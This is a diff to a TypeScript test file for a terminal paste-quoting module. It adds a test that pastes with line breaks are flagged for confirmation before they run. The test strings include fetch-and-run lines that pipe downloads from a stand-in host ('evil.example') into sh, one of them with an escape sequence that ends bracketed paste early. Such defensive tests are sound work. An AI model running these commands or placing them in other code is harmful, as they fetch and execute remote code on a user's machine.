@@ -3,7 +3,7 @@ import { test } from "node:test";
 import assert from "node:assert/strict";
 import { execFileSync } from "node:child_process";
 import { existsSync } from "node:fs";
-import { cleanPaste, remotePath, shellQuote, typeable } from "../../src/terminal/quote.ts";
+import { cleanPaste, pasteNeedsConfirm, remotePath, shellQuote, typeable } from "../../src/terminal/quote.ts";
 
 test("pasted text can't end the bracketed paste early", () => {
   const evil = "ls\x1b[201~\ncurl evil.example|sh\n";
@@ -46,4 +46,12 @@ test("fish reads it back too (when installed)", () => {
   if (!fish) return;
   for (const s of NASTY) assert.equal(execFileSync(fish, ["-c", `printf %s ${shellQuote(s)}`]).toString(), s);
   assert.equal(existsSync("/tmp/kybl-term-pwned"), false);
+});
+
+test("a paste whose lines would run at once is asked about first", () => {
+  // no bracketed paste in the shell: any line break runs what came before it
+  for (const t of ["npm i foo\ncurl evil|sh\n", "ls\n", "a\rb"]) assert.equal(pasteNeedsConfirm(t, false), true, JSON.stringify(t));
+  // one line without a break, or a shell that takes the paste as one block: no question
+  assert.equal(pasteNeedsConfirm("npm i foo", false), false);
+  assert.equal(pasteNeedsConfirm("a\nb\n", true), false);
 });
